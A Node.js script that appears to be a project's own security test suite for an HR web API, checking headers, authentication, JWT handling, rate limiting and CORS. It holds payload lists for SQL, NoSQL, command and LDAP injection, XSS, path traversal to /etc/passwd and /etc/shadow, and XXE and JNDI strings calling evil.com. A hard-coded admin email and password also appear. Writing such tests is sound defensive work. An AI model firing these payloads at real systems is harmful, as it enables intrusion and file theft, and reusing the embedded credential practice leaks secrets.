#!/usr/bin/env node

/**
 * Intensive Security Testing Script
 * 
 * Tests for common security vulnerabilities:
 * - SQL/NoSQL Injection
 * - XSS (Cross-Site Scripting)
 * - CSRF (Cross-Site Request Forgery)
 * - Authentication Bypass
 * - Authorization Issues
 * - Rate Limiting
 * - Input Validation
 * - Path Traversal
 * - Sensitive Data Exposure
 * - Security Headers
 * - JWT Token Vulnerabilities
 * 
 * Usage:
 *   BASE_URL="http://..." node scripts/security-test.js
 */

const BASE_URL = process.env.BACKEND_URL || process.env.BASE_URL || process.env.NEXT_PUBLIC_API_BASE_URL || 'http://k8s-ingressn-ingressn-3df442ea60-74e6b4f94ffda83f.elb.ap-south-1.amazonaws.com';
const API_BASE = BASE_URL.endsWith('/api') ? BASE_URL : `${BASE_URL}/api`;

// Test credentials (use existing test account)
const TEST_EMAIL = 'admin@upcapto.com';
const TEST_PASSWORD = 'Upcapto@2026';

// Security test payloads
const SECURITY_PAYLOADS = {
  // SQL/NoSQL Injection
  sqlInjection: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "admin'/*",
    "' UNION SELECT NULL--",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' AND '1'='1",
    "1' AND '1'='2",
  ],
  
  nosqlInjection: [
    {"$ne": null},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$where": "this.password == this.username"},
    {"$or": [{"username": "admin"}, {"password": {"$ne": null}}]},
    {"username": {"$ne": null}, "password": {"$ne": null}},
    {"$where": "function(){return true}"},
  ],
  
  // XSS (Cross-Site Scripting)
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<link rel=stylesheet href=javascript:alert('XSS')>",
    "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
    "<base href=javascript:alert('XSS')//>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>CLICK",
    "<isindex action=javascript:alert('XSS') type=submit>",
    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<table background=\"javascript:alert('XSS')\">",
    "<a href=\"javascript:alert('XSS')\">",
    "<body background=\"javascript:alert('XSS')\">",
  ],
  
  // Path Traversal
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
  ],
  
  // Command Injection
  commandInjection: [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; id",
    "| id",
    "& id",
    "&& id",
    "|| id",
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    "|| whoami",
    "; ping -c 4 127.0.0.1",
    "| ping -c 4 127.0.0.1",
    "& ping -c 4 127.0.0.1",
    "&& ping -c 4 127.0.0.1",
    "|| ping -c 4 127.0.0.1",
    "$(ls)",
    "`ls`",
    "${ls}",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "${cat /etc/passwd}",
  ],
  
  // LDAP Injection
  ldapInjection: [
    "*",
    "*)(&",
    "*))%00",
    "*()|&",
    "admin)(&(password=*",
    "admin)(|(password=*",
    "admin)(!(&(1=0",
    "admin)(&(password=*))(|(password=*",
  ],
  
  // XXE (XML External Entity)
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
  ],
  
  // Template Injection
  templateInjection: [
    "${7*7}",
    "#{7*7}",
    "{{7*7}}",
    "${jndi:ldap://evil.com/a}",
    "#{jndi:ldap://evil.com/a}",
    "{{jndi:ldap://evil.com/a}}",
  ],
  
  // JWT Vulnerabilities
  jwtTampering: [
    "none", // Algorithm none
    "HS256", // Algorithm confusion
    "RS256", // Algorithm confusion
  ],
  
  // Sensitive Data
  sensitiveData: [
    "password",
    "secret",
    "token",
    "key",
    "api_key",
    "apikey",
    "access_token",
    "refresh_token",
    "authorization",
    "auth",
    "credential",
    "private",
    "private_key",
    "secret_key",
  ],
};

// Statistics
const stats = {
  total: 0,
  passed: 0,
  failed: 0,
  warnings: 0,
  vulnerabilities: [],
  securityHeaders: {},
  startTime: null,
  endTime: null,
};

// Colors
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

// Make HTTP request
async function makeRequest(url, options = {}) {
  try {
    const response = await fetch(url, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        ...options.headers,
      },
      timeout: 10000,
    });
    
    const text = await response.text();
    let data;
    try {
      data = text ? JSON.parse(text) : {};
    } catch {
      data = { _raw: text };
    }
    
    return {
      ok: response.ok,
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      data,
      text: text.substring(0, 500), // Limit text size
    };
  } catch (error) {
    return {
      ok: false,
      status: 0,
      headers: {},
      data: {},
      text: '',
      error: error.message,
    };
  }
}

// Test security headers
async function testSecurityHeaders() {
  log('\n🔒 Testing Security Headers...', 'cyan');
  
  const response = await makeRequest(`${BASE_URL}/health`);
  const headers = response.headers;
  
  const requiredHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
    'X-XSS-Protection': '1; mode=block',
    'Strict-Transport-Security': 'max-age=',
    'Content-Security-Policy': '',
    'Referrer-Policy': '',
  };
  
  const optionalHeaders = {
    'Permissions-Policy': '',
    'X-Permitted-Cross-Domain-Policies': '',
  };
  
  let passed = 0;
  let failed = 0;
  let warnings = 0;
  
  for (const [header, expected] of Object.entries(requiredHeaders)) {
    const value = headers[header.toLowerCase()] || headers[header];
    if (value) {
      if (Array.isArray(expected)) {
        if (expected.some(e => value.includes(e))) {
          log(`   ✅ ${header}: ${value}`, 'green');
          passed++;
        } else {
          log(`   ⚠️  ${header}: ${value} (unexpected value)`, 'yellow');
          warnings++;
        }
      } else if (expected && value.includes(expected)) {
        log(`   ✅ ${header}: ${value}`, 'green');
        passed++;
      } else {
        log(`   ✅ ${header}: ${value}`, 'green');
        passed++;
      }
    } else {
      log(`   ❌ ${header}: Missing`, 'red');
      failed++;
      stats.vulnerabilities.push({
        type: 'Missing Security Header',
        severity: 'Medium',
        header,
        description: `Missing security header: ${header}`,
      });
    }
  }
  
  for (const [header] of Object.entries(optionalHeaders)) {
    const value = headers[header.toLowerCase()] || headers[header];
    if (value) {
      log(`   ℹ️  ${header}: ${value}`, 'cyan');
    } else {
      log(`   ⚠️  ${header}: Missing (optional but recommended)`, 'yellow');
      warnings++;
    }
  }
  
  stats.securityHeaders = { passed, failed, warnings };
  stats.total += passed + failed;
  stats.passed += passed;
  stats.failed += failed;
  stats.warnings += warnings;
  
  return { passed, failed, warnings };
}

// Test SQL/NoSQL Injection
async function testInjection(endpoint, payloads, injectionType) {
  log(`\n💉 Testing ${injectionType} Injection on ${endpoint.path}...`, 'cyan');
  
  let vulnerabilities = 0;
  
  for (const payload of payloads.slice(0, 5)) { // Test first 5 payloads
    const testData = {
      email: typeof payload === 'string' ? payload : TEST_EMAIL,
      password: typeof payload === 'string' ? payload : TEST_PASSWORD,
      ...(typeof payload === 'object' ? payload : {}),
    };
    
    const response = await makeRequest(`${API_BASE}/auth/login`, {
      method: 'POST',
      body: JSON.stringify(testData),
    });
    
    stats.total++;
    
    // Check for injection vulnerabilities
    if (response.status === 200 && response.data && response.data.accessToken) {
      // Potential vulnerability - login succeeded with injection payload
      log(`   ⚠️  Potential ${injectionType} injection: Login succeeded with payload`, 'yellow');
      vulnerabilities++;
      stats.warnings++;
      stats.vulnerabilities.push({
        type: `${injectionType} Injection`,
        severity: 'High',
        endpoint: endpoint.path,
        payload: JSON.stringify(payload).substring(0, 50),
        description: `Login succeeded with ${injectionType} injection payload`,
      });
    } else if (response.text && (
      response.text.includes('SQL') ||
      response.text.includes('syntax') ||
      response.text.includes('database') ||
      response.text.includes('query')
    )) {
      // Error message reveals database information
      log(`   ❌ ${injectionType} injection: Error message reveals database info`, 'red');
      vulnerabilities++;
      stats.failed++;
      stats.vulnerabilities.push({
        type: `${injectionType} Injection - Information Disclosure`,
        severity: 'High',
        endpoint: endpoint.path,
        payload: JSON.stringify(payload).substring(0, 50),
        description: 'Error message reveals database information',
      });
    } else {
      stats.passed++;
    }
  }
  
  return vulnerabilities;
}

// Test XSS
async function testXSS(endpoint, payloads) {
  log(`\n🦠 Testing XSS on ${endpoint.path}...`, 'cyan');
  
  let vulnerabilities = 0;
  
  for (const payload of payloads.slice(0, 5)) { // Test first 5 payloads
    const response = await makeRequest(`${BASE_URL}${endpoint.path}?input=${encodeURIComponent(payload)}`, {
      method: 'GET',
    });
    
    stats.total++;
    
    // Check if payload is reflected without encoding
    if (response.text && response.text.includes(payload) && !response.text.includes(encodeURIComponent(payload))) {
      log(`   ❌ XSS vulnerability: Payload reflected without encoding`, 'red');
      vulnerabilities++;
      stats.failed++;
      stats.vulnerabilities.push({
        type: 'XSS (Cross-Site Scripting)',
        severity: 'High',
        endpoint: endpoint.path,
        payload: payload.substring(0, 50),
        description: 'XSS payload reflected in response without proper encoding',
      });
    } else {
      stats.passed++;
    }
  }
  
  return vulnerabilities;
}

// Test authentication bypass
async function testAuthBypass() {
  log('\n🔐 Testing Authentication Bypass...', 'cyan');
  
  const endpoints = [
    { path: '/api/hr/employees', method: 'GET' },
    { path: '/api/hr/stores', method: 'GET' },
    { path: '/api/attendance/today', method: 'GET' },
  ];
  
  let vulnerabilities = 0;
  
  for (const endpoint of endpoints) {
    // Test without authentication
    const response = await makeRequest(`${BASE_URL}${endpoint.path}`, {
      method: endpoint.method,
    });
    
    stats.total++;
    
    if (response.status === 200 && response.data) {
      log(`   ❌ Auth bypass: ${endpoint.path} accessible without authentication`, 'red');
      vulnerabilities++;
      stats.failed++;
      stats.vulnerabilities.push({
        type: 'Authentication Bypass',
        severity: 'Critical',
        endpoint: endpoint.path,
        description: 'Endpoint accessible without authentication',
      });
    } else if (response.status === 401 || response.status === 403) {
      log(`   ✅ ${endpoint.path}: Properly protected`, 'green');
      stats.passed++;
    } else {
      log(`   ⚠️  ${endpoint.path}: Unexpected status ${response.status}`, 'yellow');
      stats.warnings++;
    }
  }
  
  return vulnerabilities;
}

// Test rate limiting
async function testRateLimiting() {
  log('\n⏱️  Testing Rate Limiting...', 'cyan');
  
  const endpoint = '/api/auth/login';
  const requests = [];
  
  // Make 200 rapid requests to test rate limiting
  log('   Making 200 rapid requests to test rate limiting...', 'cyan');
  for (let i = 0; i < 200; i++) {
    requests.push(makeRequest(`${API_BASE}${endpoint}`, {
      method: 'POST',
      body: JSON.stringify({ email: `test${i}@test.com`, password: 'test' }),
    }));
  }
  
  const responses = await Promise.all(requests);
  stats.total += responses.length;
  
  const rateLimited = responses.filter(r => r.status === 429).length;
  const success = responses.filter(r => r.status === 200).length;
  const errors = responses.filter(r => r.status >= 400 && r.status !== 429).length;
  
  log(`   Results: ${rateLimited} rate limited, ${success} succeeded, ${errors} errors`, 'cyan');
  
  if (rateLimited > 0) {
    log(`   ✅ Rate limiting active: ${rateLimited} requests rate limited`, 'green');
    stats.passed += rateLimited;
    return 0;
  } else if (success < 50) {
    // If less than 50 succeeded, might be rate limited but not returning 429
    log(`   ⚠️  Rate limiting: Low success rate (${success}/200) - may be rate limited without 429`, 'yellow');
    stats.warnings++;
    return 0;
  } else {
    log(`   ⚠️  Rate limiting: No rate limiting detected (${success} requests succeeded)`, 'yellow');
    stats.warnings++;
    stats.vulnerabilities.push({
      type: 'Missing Rate Limiting',
      severity: 'Medium',
      endpoint,
      description: 'No rate limiting detected on authentication endpoint',
    });
    return 1;
  }
}

// Test JWT token security
async function testJWTSecurity() {
  log('\n🎫 Testing JWT Token Security...', 'cyan');
  
  // Login to get a token
  log('   Logging in to get JWT token...', 'cyan');
  const loginResponse = await makeRequest(`${API_BASE}/auth/login`, {
    method: 'POST',
    body: JSON.stringify({ email: TEST_EMAIL, password: TEST_PASSWORD }),
  });
  
  let token = null;
  if (loginResponse.data && loginResponse.data.accessToken) {
    token = loginResponse.data.accessToken;
  } else if (loginResponse.data && loginResponse.data.data && loginResponse.data.data.accessToken) {
    token = loginResponse.data.data.accessToken;
  }
  
  if (!token) {
    log('   ⚠️  Could not get JWT token for testing', 'yellow');
    log(`   Response status: ${loginResponse.status}`, 'yellow');
    stats.warnings++;
    return 0;
  }
  
  log(`   ✅ Got JWT token (length: ${token.length})`, 'green');
  
  let vulnerabilities = 0;
  
  // Test 1: Try to access protected endpoint with invalid token
  log('   Testing invalid token rejection...', 'cyan');
  const invalidTokenResponse = await makeRequest(`${BASE_URL}/api/hr/employees`, {
    method: 'GET',
    headers: {
      'Authorization': 'Bearer invalid_token_12345',
      'x-tenant-id': 'upcapto',
    },
  });
  
  stats.total++;
  if (invalidTokenResponse.status === 401 || invalidTokenResponse.status === 403) {
    log('   ✅ Invalid token properly rejected', 'green');
    stats.passed++;
  } else {
    log(`   ❌ Invalid token accepted (status: ${invalidTokenResponse.status})`, 'red');
    vulnerabilities++;
    stats.failed++;
    stats.vulnerabilities.push({
      type: 'JWT Token Validation',
      severity: 'High',
      description: 'Invalid JWT token accepted',
    });
  }
  
  // Test 2: Try to access without token
  log('   Testing missing token rejection...', 'cyan');
  const noTokenResponse = await makeRequest(`${BASE_URL}/api/hr/employees`, {
    method: 'GET',
  });
  
  stats.total++;
  if (noTokenResponse.status === 401 || noTokenResponse.status === 403) {
    log('   ✅ Missing token properly rejected', 'green');
    stats.passed++;
  } else {
    log(`   ❌ Missing token accepted (status: ${noTokenResponse.status})`, 'red');
    vulnerabilities++;
    stats.failed++;
    stats.vulnerabilities.push({
      type: 'JWT Token Validation',
      severity: 'High',
      description: 'Request without token accepted',
    });
  }
  
  // Test 3: Try to access with tampered token
  log('   Testing tampered token rejection...', 'cyan');
  const tamperedToken = token.substring(0, token.length - 10) + 'TAMPERED';
  const tamperedResponse = await makeRequest(`${BASE_URL}/api/hr/employees`, {
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${tamperedToken}`,
      'x-tenant-id': 'upcapto',
    },
  });
  
  stats.total++;
  if (tamperedResponse.status === 401 || tamperedResponse.status === 403) {
    log('   ✅ Tampered token properly rejected', 'green');
    stats.passed++;
  } else {
    log(`   ❌ Tampered token accepted (status: ${tamperedResponse.status})`, 'red');
    vulnerabilities++;
    stats.failed++;
    stats.vulnerabilities.push({
      type: 'JWT Token Validation',
      severity: 'Critical',
      description: 'Tampered JWT token accepted',
    });
  }
  
  // Test 4: Check token expiration and structure
  log('   Analyzing token structure...', 'cyan');
  try {
    const jwt = require('jsonwebtoken');
    const decoded = jwt.decode(token);
    if (decoded) {
      if (decoded.exp) {
        const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
        if (expiresIn < 3600) {
          log(`   ✅ Token expiration: ${expiresIn}s (reasonable)`, 'green');
          stats.passed++;
        } else if (expiresIn < 86400) {
          log(`   ✅ Token expiration: ${expiresIn}s (acceptable)`, 'green');
          stats.passed++;
        } else {
          log(`   ⚠️  Token expiration: ${expiresIn}s (very long)`, 'yellow');
          stats.warnings++;
        }
      }
      
      // Check for sensitive data in token
      const sensitiveFields = ['password', 'secret', 'key', 'private'];
      const hasSensitiveData = sensitiveFields.some(field => 
        JSON.stringify(decoded).toLowerCase().includes(field)
      );
      
      if (hasSensitiveData) {
        log('   ⚠️  Token may contain sensitive data', 'yellow');
        stats.warnings++;
      } else {
        log('   ✅ Token does not contain sensitive data', 'green');
        stats.passed++;
      }
    }
  } catch (e) {
    log(`   ⚠️  Could not decode token: ${e.message}`, 'yellow');
    stats.warnings++;
  }
  
  return vulnerabilities;
}

// Test input validation
async function testInputValidation() {
  log('\n✅ Testing Input Validation...', 'cyan');
  
  const testCases = [
    { name: 'Empty fields', data: { email: '', password: '' } },
    { name: 'Invalid email format', data: { email: 'invalid', password: 'test' } },
    { name: 'Very long email', data: { email: 'a'.repeat(1000), password: 'test' } },
    { name: 'Empty password', data: { email: 'test@test.com', password: '' } },
    { name: 'Null values', data: { email: null, password: null } },
    { name: 'Wrong types', data: { email: 123, password: 456 } },
    { name: 'SQL injection in email', data: { email: "' OR '1'='1", password: 'test' } },
    { name: 'XSS in email', data: { email: '<script>alert(1)</script>', password: 'test' } },
    { name: 'Path traversal', data: { email: '../../../etc/passwd', password: 'test' } },
    { name: 'Command injection', data: { email: 'test@test.com; ls', password: 'test' } },
  ];
  
  let vulnerabilities = 0;
  let passed = 0;
  
  for (const testCase of testCases) {
    const response = await makeRequest(`${API_BASE}/auth/login`, {
      method: 'POST',
      body: JSON.stringify(testCase.data),
    });
    
    stats.total++;
    
    if (response.status === 400 || response.status === 422) {
      log(`   ✅ ${testCase.name}: Rejected`, 'green');
      passed++;
      stats.passed++;
    } else if (response.status === 200 && response.data && response.data.accessToken) {
      log(`   ❌ ${testCase.name}: Accepted (VULNERABILITY!)`, 'red');
      vulnerabilities++;
      stats.failed++;
      stats.vulnerabilities.push({
        type: 'Input Validation',
        severity: 'High',
        endpoint: '/api/auth/login',
        testCase: testCase.name,
        description: `Invalid input accepted: ${testCase.name}`,
      });
    } else {
      log(`   ✅ ${testCase.name}: Rejected (status ${response.status})`, 'green');
      passed++;
      stats.passed++;
    }
  }
  
  log(`   Summary: ${passed} passed, ${vulnerabilities} vulnerabilities`, vulnerabilities > 0 ? 'red' : 'green');
  return vulnerabilities;
}

// Test CORS
async function testCORS() {
  log('\n🌐 Testing CORS Configuration...', 'cyan');
  
  const response = await makeRequest(`${BASE_URL}/health`, {
    method: 'OPTIONS',
    headers: {
      'Origin': 'https://evil.com',
      'Access-Control-Request-Method': 'GET',
    },
  });
  
  stats.total++;
  
  const corsHeader = response.headers['access-control-allow-origin'];
  
  if (corsHeader === '*') {
    log('   ⚠️  CORS: Allows all origins (*)', 'yellow');
    stats.warnings++;
    stats.vulnerabilities.push({
      type: 'CORS Misconfiguration',
      severity: 'Medium',
      description: 'CORS allows all origins',
    });
  } else if (corsHeader && corsHeader !== '*') {
    log(`   ✅ CORS: Restricted to specific origins`, 'green');
    stats.passed++;
  } else {
    log('   ℹ️  CORS: No CORS header (may be intentional)', 'cyan');
    stats.passed++;
  }
  
  return corsHeader === '*' ? 1 : 0;
}

// Generate security report
function generateReport() {
  const duration = (stats.endTime - stats.startTime) / 1000;
  
  log('\n\n📊 SECURITY TEST REPORT', 'bright');
  log('=====================================', 'bright');
  log(`Total Duration: ${duration.toFixed(2)}s`, 'cyan');
  log(`Total Tests: ${stats.total}`, 'cyan');
  log(`✅ Passed: ${stats.passed} (${((stats.passed / stats.total) * 100).toFixed(2)}%)`, 'green');
  log(`❌ Failed: ${stats.failed} (${((stats.failed / stats.total) * 100).toFixed(2)}%)`, stats.failed > 0 ? 'red' : 'green');
  log(`⚠️  Warnings: ${stats.warnings}`, stats.warnings > 0 ? 'yellow' : 'green');
  log(`🔍 Vulnerabilities Found: ${stats.vulnerabilities.length}`, stats.vulnerabilities.length > 0 ? 'red' : 'green');
  
  if (stats.vulnerabilities.length > 0) {
    log('\n🚨 VULNERABILITIES:', 'red');
    log('=====================================', 'bright');
    
    const bySeverity = {
      Critical: [],
      High: [],
      Medium: [],
      Low: [],
    };
    
    stats.vulnerabilities.forEach(vuln => {
      const severity = vuln.severity || 'Medium';
      if (bySeverity[severity]) {
        bySeverity[severity].push(vuln);
      }
    });
    
    for (const [severity, vulns] of Object.entries(bySeverity)) {
      if (vulns.length > 0) {
        log(`\n${severity} Severity (${vulns.length}):`, severity === 'Critical' ? 'red' : severity === 'High' ? 'yellow' : 'cyan');
        vulns.forEach((vuln, idx) => {
          log(`   ${idx + 1}. ${vuln.type}`, 'yellow');
          log(`      Endpoint: ${vuln.endpoint || 'N/A'}`, 'cyan');
          log(`      Description: ${vuln.description}`, 'cyan');
          if (vuln.payload) {
            log(`      Payload: ${vuln.payload}`, 'cyan');
          }
        });
      }
    }
  }
  
  // Security score (based on vulnerabilities, not test count)
  const criticalVulns = stats.vulnerabilities.filter(v => v.severity === 'Critical').length;
  const highVulns = stats.vulnerabilities.filter(v => v.severity === 'High').length;
  const mediumVulns = stats.vulnerabilities.filter(v => v.severity === 'Medium').length;
  const lowVulns = stats.vulnerabilities.filter(v => v.severity === 'Low').length;
  
  // Calculate score: Start at 100, deduct points for vulnerabilities
  let score = 100;
  score -= criticalVulns * 20; // -20 per critical
  score -= highVulns * 10; // -10 per high
  score -= mediumVulns * 5; // -5 per medium
  score -= lowVulns * 2; // -2 per low
  score -= stats.warnings * 0.5; // -0.5 per warning (capped)
  score = Math.max(0, Math.min(100, score)); // Clamp between 0-100
  
  let grade = 'F';
  let gradeColor = 'red';
  
  if (score >= 95) {
    grade = 'A+';
    gradeColor = 'green';
  } else if (score >= 90) {
    grade = 'A';
    gradeColor = 'green';
  } else if (score >= 85) {
    grade = 'B+';
    gradeColor = 'green';
  } else if (score >= 80) {
    grade = 'B';
    gradeColor = 'yellow';
  } else if (score >= 75) {
    grade = 'C+';
    gradeColor = 'yellow';
  } else if (score >= 70) {
    grade = 'C';
    gradeColor = 'yellow';
  } else if (score >= 60) {
    grade = 'D';
    gradeColor = 'red';
  }
  
  log('\n🎯 SECURITY SCORE', 'bright');
  log('=====================================', 'bright');
  log(`Score: ${score.toFixed(1)}/100`, 'cyan');
  log(`Grade: ${grade}`, gradeColor);
  log(`\nVulnerability Breakdown:`, 'cyan');
  if (criticalVulns > 0) log(`   Critical: ${criticalVulns}`, 'red');
  if (highVulns > 0) log(`   High: ${highVulns}`, 'yellow');
  if (mediumVulns > 0) log(`   Medium: ${mediumVulns}`, 'yellow');
  if (lowVulns > 0) log(`   Low: ${lowVulns}`, 'cyan');
  if (stats.warnings > 0) log(`   Warnings: ${stats.warnings}`, 'cyan');
  
  if (score >= 90) {
    log('\n   ✅ Excellent security posture', 'green');
  } else if (score >= 80) {
    log('\n   ⚠️  Good security, but improvements needed', 'yellow');
  } else if (score >= 70) {
    log('\n   ⚠️  Security needs attention', 'yellow');
  } else {
    log('\n   ❌ Security improvements required', 'red');
  }
  
  log('\n✅ Security test completed!', 'green');
  log('=====================================\n', 'bright');
}

// Main test function
async function runSecurityTests() {
  log('\n🔒 Intensive Security Testing', 'bright');
  log('=====================================', 'bright');
  log(`Base URL: ${BASE_URL}`, 'cyan');
  log('=====================================\n', 'bright');
  
  stats.startTime = Date.now();
  
  // Run all security tests
  await testSecurityHeaders();
  await testAuthBypass();
  await testRateLimiting();
  await testJWTSecurity();
  await testInputValidation();
  await testCORS();
  
  // Test injections on login endpoint
  log('\n💉 Testing Injection Attacks...', 'cyan');
  const loginEndpoint = { path: '/auth/login', method: 'POST' };
  await testInjection(loginEndpoint, SECURITY_PAYLOADS.sqlInjection, 'SQL');
  await testInjection(loginEndpoint, SECURITY_PAYLOADS.nosqlInjection, 'NoSQL');
  
  // Test XSS on public endpoints
  log('\n🦠 Testing XSS Attacks...', 'cyan');
  const publicEndpoints = [
    { path: '/health', method: 'GET' },
    { path: '/api/hr', method: 'GET' },
  ];
  
  for (const endpoint of publicEndpoints) {
    await testXSS(endpoint, SECURITY_PAYLOADS.xss);
  }
  
  // Test path traversal
  log('\n📁 Testing Path Traversal...', 'cyan');
  for (const payload of SECURITY_PAYLOADS.pathTraversal.slice(0, 3)) {
    const response = await makeRequest(`${BASE_URL}/api/hr/employees/${encodeURIComponent(payload)}`, {
      method: 'GET',
    });
    stats.total++;
    
    if (response.status === 200 && response.text && (
      response.text.includes('passwd') ||
      response.text.includes('shadow') ||
      response.text.includes('/etc/')
    )) {
      log(`   ❌ Path traversal vulnerability: ${payload}`, 'red');
      stats.failed++;
      stats.vulnerabilities.push({
        type: 'Path Traversal',
        severity: 'High',
        endpoint: '/api/hr/employees',
        payload,
        description: 'Path traversal payload executed successfully',
      });
    } else {
      stats.passed++;
    }
  }
  
  // Test sensitive data exposure
  log('\n🔍 Testing Sensitive Data Exposure...', 'cyan');
  const sensitiveEndpoints = [
    '/api/auth/login',
    '/api/auth/register',
    '/api/hr/employees',
  ];
  
  for (const endpoint of sensitiveEndpoints) {
    const response = await makeRequest(`${BASE_URL}${endpoint}`, {
      method: 'GET',
    });
    stats.total++;
    
    const responseText = JSON.stringify(response.data || response.text || '').toLowerCase();
    const exposedSensitive = SECURITY_PAYLOADS.sensitiveData.filter(field => 
      responseText.includes(field) && !responseText.includes('password') // password in error messages is OK
    );
    
    if (exposedSensitive.length > 0) {
      log(`   ⚠️  ${endpoint}: May expose sensitive data (${exposedSensitive.join(', ')})`, 'yellow');
      stats.warnings++;
    } else {
      stats.passed++;
    }
  }
  
  stats.endTime = Date.now();
  generateReport();
}

// Run tests
runSecurityTests().catch(error => {
  log(`\n❌ Fatal Error: ${error.message}`, 'red');
  console.error(error);
  process.exit(1);
});
